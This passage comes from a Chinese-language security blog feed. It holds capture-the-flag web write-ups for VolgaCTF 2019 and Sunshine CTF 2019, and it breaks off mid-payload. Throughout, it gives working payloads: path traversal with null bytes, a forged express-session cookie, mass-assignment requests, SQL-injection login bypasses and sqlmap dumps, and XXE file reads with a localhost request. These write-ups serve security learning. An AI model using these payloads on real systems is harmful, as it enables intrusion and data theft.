(2) PHP的小bug，%00截断（null byte injection）致使file_exists出错进而列目录； (3) session-file-store模块会将session存在json格式的文件中，如果指定session所在的目录，express-session模块将会去对应的目录下取出session信息；</li><li>漏洞利用 有了以上的信息，我们首先测试main.js提供的<code>/api/images?year=${year}</code>接口。首先利用第一个tips，express的非规范化路径，绕过auth.js的认证。 <img src="https://i.loli.net/2019/04/03/5ca43e9ac1757.png" alt="2CD29029-253F-4C33-AB17-48ED2554C4D9.png"> <code>//</code>的情况如下，可以看到已经绕过了认证并且应该可以读文件了。 <img src="https://i.loli.net/2019/04/03/5ca43ed8b02d6.png" alt="613A1694-476E-43B2-ABE4-2518DD27D02C.png"> 但是当尝试读取image的时候却出现了如下报错，从错误信息上我们可以得到如下两点信息:首先，绝对路径是<code>/var/www/apps/volga_gallery/storage/app/2019/img/</code>；其次，这是一个laravel框架。<img src="https://i.loli.net/2019/04/03/5ca43efc015d1.png" alt="56CE4CC6-3037-4150-B587-42670A1DC4F0.png"> 其实是我输入的年份没有图片，我修改为2018即得到如下信息，所以确认可以列目录下文件了。 <img src="https://i.loli.net/2019/04/03/5ca43f204bc89.png" alt="4799816A-91C8-483F-94C0-B9949972CF3A.png"> 之前知道后端是采用PHP框架处理，所以我先在2018路径后注入%00，之后成功得到当前目录 <img src="https://i.loli.net/2019/04/03/5ca43f52e73eb.png" alt="24B686AC-603E-4CEE-A0F5-9F411FEE092B.png"> 之后继续查看其它目录信息,最终在<code>//api/images?year=2018/../../../../volga_adminpanel%00</code>路径下找到了session信息 <img src="https://i.loli.net/2019/04/03/5ca43f8dc3c19.png" alt="B4CEB3D9-21DC-4625-9240-3F20EA3B2366.png"> <img src="https://i.loli.net/2019/04/03/5ca43fab8e34f.png" alt="BC67D40F-5399-4913-81D4-AE7364663FB9.png"> <img src="https://i.loli.net/2019/04/03/5ca43fc400c8b.png" alt="659D85A9-3C60-4956-AC7A-55BCF3E3784E.png"> 但是我们并不能直接读取这个文件，因此就用到第3个tips，直接在cookie字段这个路径写入。但是这里是设计session的计算问题的。我在本地搭建了一个环境，修改了部分代码。 node_modules/express-session/index.js</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setcookie</span>(<span class="params">res, name, val, secret, options</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> signed = <span class="string">'s:'</span> + signature.sign(val, secret);</span><br><span class="line">  <span class="keyword">var</span> data = cookie.serialize(name, signed, options);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sign my payload</span></span><br><span class="line">  <span class="keyword">var</span> signed2 = <span class="string">'s:'</span> + signature.sign(<span class="string">"../../volga_adminpanel/sessions/euzb7bMKx-5F29b2xNobGTDoWXmVFlEM.json"</span>, secret);</span><br><span class="line">  <span class="keyword">var</span> data2 = cookie.serialize(name, signed2, options);</span><br><span class="line">  <span class="built_in">console</span>.log(data2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  debug(<span class="string">'set-cookie %s'</span>, data);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> prev = res.getHeader(<span class="string">'set-cookie'</span>) || [];</span><br><span class="line">  <span class="keyword">var</span> header = <span class="built_in">Array</span>.isArray(prev) ? prev.concat(data) : [prev, data];</span><br><span class="line"></span><br><span class="line">  res.setHeader(<span class="string">'set-cookie'</span>, header)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index.js中增加</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">`<span class="subst">$&#123;config.apiPrefix&#125;</span>/payload`</span>,<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">  req.session.test=<span class="string">"test"</span>;</span><br><span class="line">  res.end(<span class="string">"OK"</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>config.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whitelistPaths: [</span><br><span class="line">  <span class="string">'/api/login'</span>, <span class="string">'/api/logout'</span>,<span class="string">'/api/payload'</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>之后本地启动并访问 <img src="https://i.loli.net/2019/04/03/5ca43ff56b20d.png" alt="655D3C99-58E0-4B98-A334-AF401BD9C7A8.png"> 得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s%3A..%2F..%2Fvolga_adminpanel%2Fsessions%2Feuzb7bMKx-5F29b2xNobGTDoWXmVFlEM.KrY7Bi6sZtBB%2FJ4sPnVj5QkDEuBu%2F0QelFQQqAV6yh4</span><br></pre></td></tr></table></figure><p>之后设置cookie字段进行提交即可得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i http://gallery.q.2019.volgactf.ru/api/flag --cookie &quot;SESSION=s%3A..%2F..%2Fvolga_adminpanel%2Fsessions%2Feuzb7bMKx-5F29b2xNobGTDoWXmVFlEM.KrY7Bi6sZtBB%2FJ4sPnVj5QkDEuBu%2F0QelFQQqAV6yh4&quot; -L</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/03/5ca440109c090.png" alt="63B08906-2188-472C-AC0C-4FB2634C838E.png"></p><p> flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VolgaCTF&#123;31c2ac53d4101a01264775328797d424&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-Blog"><a href="#0x04-Blog" class="headerlink" title="0x04 Blog"></a>0x04 Blog</h2><h2 id="0x05-Shop-V-2"><a href="#0x05-Shop-V-2" class="headerlink" title="0x05 Shop V.2"></a>0x05 Shop V.2</h2><ol><li>信息泄露 robots.txt-&gt;shop.1.0.1.war</li><li>代码审计 这个版本在buy路由处已经修复了1.0.0版本的自动绑定漏洞，但是在profile是存在的，并且可以控制一些变量，此版本我们可以看到user类中多了对cart的处理，所以考虑使用cart来完成。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Product&gt; <span class="title">getCartItems</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.cart;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCartItems</span><span class="params">(List&lt;Product&gt; cart)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.cart = cart;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们继续在controller中看下id是被使用做判断product的id的，那么很明显了，我们只要修改一下id就好</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(&#123;<span class="string">"/profile"</span>&#125;)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">profile</span><span class="params">(@ModelAttribute(<span class="string">"user"</span>)</span> User user, Model templateModel, HttpServletRequest request) </span>&#123;</span><br><span class="line">    HttpSession session = request.getSession();</span><br><span class="line">    <span class="keyword">if</span> (session.getAttribute(<span class="string">"user_id"</span>) == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"redirect:index"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        List&lt;Product&gt; cart = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        user.getCartItems().forEach((p) -&gt; &#123;</span><br><span class="line">            cart.add(<span class="keyword">this</span>.productDao.geProduct(p.getId()));</span><br><span class="line">        &#125;);</span><br><span class="line">        templateModel.addAttribute(<span class="string">"cart"</span>, cart);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"profile"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /profile HTTP/1.1</span><br><span class="line">Host: shop2.q.2019.volgactf.ru</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://shop2.q.2019.volgactf.ru/index</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 30</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=C77EBD253171F45F0E5F18DC4AB68B57</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">name=zeroyu&amp;CartItems[0].id=4</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VolgaCTF&#123;e86007271413cc1ac563c6eca0e12b62&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;比赛地址: &lt;a href=&quot;https://q.2019.volgactf.ru/tasks&quot; t
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Sunshine CTF 2019 Web</title>
    <link href="http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/"/>
    <id>http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/</id>
    <published>2019-04-02T01:37:30.000Z</published>
    <updated>2019-04-02T01:44:17.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>比赛地址: <a href="https://2019.sunshinectf.org/challenges" target="_blank" rel="noopener">https://2019.sunshinectf.org/challenges</a></p><p>时间: 星期日, 30 三月 2019, 1:00 AM (1:00) — 星期一, 01 四月 2019, 1:00 PM (13:00) </p><h2 id="0x01-WrestlerBook"><a href="#0x01-WrestlerBook" class="headerlink" title="0x01 WrestlerBook"></a>0x01 WrestlerBook</h2><h3 id="1-题目描述"><a href="#1-题目描述" class="headerlink" title="1.题目描述"></a>1.题目描述</h3><p>WrestlerBook is the social network for wrestlers, by wrestlers. WrestlerBook is exclusively for wrestlers, so if you didn’t get an invite don’t even bother trying to view our profiles.</p><p><a href="http://bk.sunshinectf.org" target="_blank" rel="noopener">http://bk.sunshinectf.org</a></p><p>Author: dmaria</p><h3 id="2-解题思路"><a href="#2-解题思路" class="headerlink" title="2.解题思路"></a>2.解题思路</h3><p>看到登录界面先尝试使用万能密码进行fuzz一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; --</span><br><span class="line">admin&apos; #</span><br><span class="line">admin&apos;/*</span><br><span class="line">&apos; or 1=1--</span><br><span class="line">&apos; or 1=1#</span><br><span class="line">&apos; or 1=1/*</span><br><span class="line">&apos;) or &apos;1&apos;=&apos;1--</span><br><span class="line">&apos;) or (&apos;1&apos;=&apos;1--</span><br><span class="line">&apos; or 1;#</span><br></pre></td></tr></table></figure><p>最终发现<code>&#39; or 1=1--</code>等几个可以成功登录，并且在登录之后我发现存在flag关键词并且对应的值为N/A <img src="https://i.loli.net/2019/04/02/5ca2bd3740165.png" alt="974FFF3C-D28B-48DB-A3F3-6B7986022982.png"></p><p>并且在fuzz过程中发现会出现如下错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Date: Mon, 01 Apr 2019 14:24:46 GMT</span><br><span class="line">Server: Apache/2.4.25 (Debian)</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Powered-By: PHP/7.0.33</span><br><span class="line">Content-Length: 380</span><br><span class="line">Connection: Close</span><br><span class="line"></span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Warning&lt;/b&gt;:  SQLite3::query(): Unable to prepare statement: 1, unrecognized token: &amp;quot;#&amp;quot; in &lt;b&gt;/var/www/html/login.php&lt;/b&gt; on line &lt;b&gt;19&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught Error: Call to a member function fetchArray() on boolean in /var/www/html/login.php:20</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br><span class="line">  thrown in &lt;b&gt;/var/www/html/login.php&lt;/b&gt; on line &lt;b&gt;20&lt;/b&gt;&lt;br /&gt;</span><br></pre></td></tr></table></figure><p>其实后面的工作可以直接使用sqlmap来进行了</p><p><img src="https://i.loli.net/2019/04/02/5ca2bd547fe01.png" alt="6930ECB0-5A74-4EA4-89FC-32445C4443D4.png"></p><p>要注意一下sqlite中包含各种信息的表是sqlite_master。</p><p>所以使用sqlmap默认去跑的话是注不出数据的 首先猜解下<code>sqlite_master</code>表中的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqli.txt -T &quot;sqlite_master&quot; --columns</span><br></pre></td></tr></table></figure><p>可以看到关键信息有name，但是关键的sql就没有显示 之后查name中有什么信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqli.txt -T &quot;sqlite_master&quot; -C &quot;name&quot; --dump</span><br></pre></td></tr></table></figure><p>但是直接注name中的user表，是跑不出信息的。所以我们查一下sql表中的信息，看user表是怎样构成的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqli.txt -T &quot;sqlite_master&quot; -C &quot;sql&quot; --dump</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/02/5ca2bd6a7ae08.png" alt="708F625A-1562-4597-B481-AA68C38283F2.png"></p><p> 表结构出来了之后直接查flag就好了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqli.txt --sql-query=&quot;SELECT group_concat(flag) FROM users&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/02/5ca2bd7e30458.png" alt="屏幕快照 2019-04-02 上午9.17.45.png"></p><p>手动注入参考： <a href="https://ctftime.org/writeup/14208" target="_blank" rel="noopener">https://ctftime.org/writeup/14208</a></p><p>关键payload记录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: admin</span><br><span class="line">Password: ' union <span class="keyword">SELECT</span> <span class="number">1</span>, <span class="number">2</span>, <span class="keyword">group_concat</span>(<span class="keyword">name</span>), <span class="number">4</span>, <span class="keyword">group_concat</span>(<span class="keyword">sql</span>), <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span> <span class="keyword">FROM</span> sqlite_master <span class="keyword">WHERE</span> <span class="keyword">type</span> = <span class="string">"table"</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>获取表的结构</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`users`</span> (</span><br><span class="line">    <span class="string">`username`</span>  <span class="built_in">TEXT</span>,</span><br><span class="line">    <span class="string">`password`</span>  <span class="built_in">TEXT</span>,</span><br><span class="line">    <span class="string">`avatar`</span>    <span class="built_in">TEXT</span>,</span><br><span class="line">    <span class="string">`age`</span>   <span class="built_in">INTEGER</span>,</span><br><span class="line">    <span class="string">`name`</span>  <span class="built_in">TEXT</span>,</span><br><span class="line">    <span class="string">`title`</span> <span class="built_in">TEXT</span>,</span><br><span class="line">    <span class="string">`flag`</span>  <span class="built_in">TEXT</span>,</span><br><span class="line">    <span class="string">`id`</span>    <span class="built_in">INTEGER</span> PRIMARY <span class="keyword">KEY</span> AUTOINCREMENT</span><br><span class="line">),<span class="keyword">CREATE</span> <span class="keyword">TABLE</span> sqlite_sequence(<span class="keyword">name</span>,seq)</span><br></pre></td></tr></table></figure><p>dump flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: admin</span><br><span class="line">Password: ' union <span class="keyword">SELECT</span> <span class="keyword">group_concat</span>(username), <span class="keyword">group_concat</span>(<span class="keyword">password</span>), <span class="keyword">group_concat</span>(avatar), <span class="keyword">group_concat</span>(age), <span class="keyword">group_concat</span>(<span class="keyword">name</span>), <span class="keyword">group_concat</span>(title), <span class="keyword">group_concat</span>(flag), <span class="keyword">group_concat</span>(<span class="keyword">id</span>) <span class="keyword">FROM</span> <span class="keyword">users</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>返回值</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"desc"</span>&gt;</span>Flag: N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,example_flag,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,sun&#123;ju57_4n07h3r_5ql1_ch4ll&#125;,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-Wrestler-Name-Generator"><a href="#0x02-Wrestler-Name-Generator" class="headerlink" title="0x02 Wrestler Name Generator"></a>0x02 Wrestler Name Generator</h2><h3 id="1-题目描述-1"><a href="#1-题目描述-1" class="headerlink" title="1.题目描述"></a>1.题目描述</h3><p>Even better than the Wu-Tang name generator, legend has it that Hulk Hogan used this app to get his name.</p><p><a href="http://ng.sunshinectf.org" target="_blank" rel="noopener">http://ng.sunshinectf.org</a></p><p>Author: dmaria</p><h3 id="2-解题思路-1"><a href="#2-解题思路-1" class="headerlink" title="2.解题思路"></a>2.解题思路</h3><p>关键点：可以看到我输入的名称之后还是完成的进行了显示，服务端脚本是PHP，并且请求的Accept字段中有xml，所以猜测可能是XXE</p><p>注意在使用paylaod是要先base64后url编码 进一步使用如下不合法的XML数据进行测试</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xml</span> <span class="attr">version</span>=<span class="string">"abc"</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Doc</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>观察到报错</p><p><img src="https://i.loli.net/2019/04/02/5ca2bd993f247.png" alt="33F95B3F-40F7-44B5-94E3-F2F866E8FCC5.png"></p><p> 确认是xxe漏洞，之后使用如下payload尝试去读取<code>generate.php</code>的源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&apos;1.0&apos; encoding=&apos;UTF-8&apos;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &apos;php://filter/convert.base64-encode/resource=generate.php&apos;&gt;]&gt;&lt;input&gt;&lt;firstName&gt;&amp;xxe;&lt;/firstName&gt;&lt;/input&gt;</span><br></pre></td></tr></table></figure><p>服务端的源代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$whitelist = array(</span><br><span class="line">    &apos;127.0.0.1&apos;,</span><br><span class="line">    &apos;::1&apos;</span><br><span class="line">);</span><br><span class="line">// if this page is accessed from the web server, the flag is returned</span><br><span class="line">// flag is in env variable to avoid people using XXE to read the flag</span><br><span class="line">// REMOTE_ADDR field is able to be spoofed (unless you already are on the server)</span><br><span class="line">if(in_array($_SERVER[&apos;REMOTE_ADDR&apos;], $whitelist))&#123;</span><br><span class="line">echo $_ENV[&quot;FLAG&quot;];</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">// make sure the input parameter exists</span><br><span class="line">if (empty($_GET[&quot;input&quot;])) &#123;</span><br><span class="line">echo &quot;Please include the &apos;input&apos; get parameter with your request, Brother&quot;;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// get input</span><br><span class="line">$xmlData = base64_decode($_GET[&quot;input&quot;]);</span><br><span class="line">// parse xml</span><br><span class="line">$xml=simplexml_load_string($xmlData, null, LIBXML_NOENT) or die(&quot;Error parsing XML: &quot;.&quot;\n&quot;.$xmlData);</span><br><span class="line">$firstName = $xml-&gt;firstName;</span><br><span class="line">$lastName = $xml-&gt;lastName;</span><br><span class="line">// generate name</span><br><span class="line">$nouns = array(&quot;Killer&quot;, &quot;Savage&quot;, &quot;Stallion&quot;, &quot;Coder&quot;, &quot;Hacker&quot;, &quot;Slasher&quot;, &quot;Crusher&quot;, &quot;Barbarian&quot;, &quot;Ferocious&quot;, &quot;Fierce&quot;, &quot;Vicious&quot;, &quot;Hunter&quot;, &quot;Brute&quot;, &quot;Tactician&quot;, &quot;Expert&quot;);</span><br><span class="line">$noun = $nouns[array_rand($nouns)];</span><br><span class="line">$generatedName = $firstName.&apos; &quot;The &apos;.$noun.&apos;&quot; &apos;.$lastName;</span><br><span class="line"></span><br><span class="line">// return html for the results page</span><br><span class="line">echo &lt;&lt;&lt;EOT</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Wrestler Name Generator&lt;/title&gt;</span><br><span class="line">  &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css&quot;&gt;</span><br><span class="line">  &lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;script src=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;jumbotron text-center&quot;&gt;</span><br><span class="line">  &lt;h1&gt;Your Wrestler Name Is:&lt;/h1&gt;</span><br><span class="line">  &lt;h2&gt;$generatedName&lt;/h2&gt; </span><br><span class="line">&lt;!--hacker name functionality coming soon!--&gt;</span><br><span class="line">&lt;!--if you&apos;re trying to test the hacker name functionality, make sure you&apos;re accessing this page from the web server--&gt;</span><br><span class="line">&lt;!--&lt;h2&gt;Your Hacker Name Is: REDACTED&lt;/h2&gt;--&gt;</span><br><span class="line">  &lt;a href=&quot;/&quot;&gt;Go Back&lt;/a&gt; </span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">EOT;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>从源码上来看只要从本地访问<code>generate.php</code>文件就可以获取flag，所以使用如下payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0' encoding='UTF-8'?&gt;</span><span class="meta">&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM 'http://localhost/generate.php'&gt;]&gt;</span><span class="tag">&lt;<span class="name">input</span>&gt;</span><span class="tag">&lt;<span class="name">firstName</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span 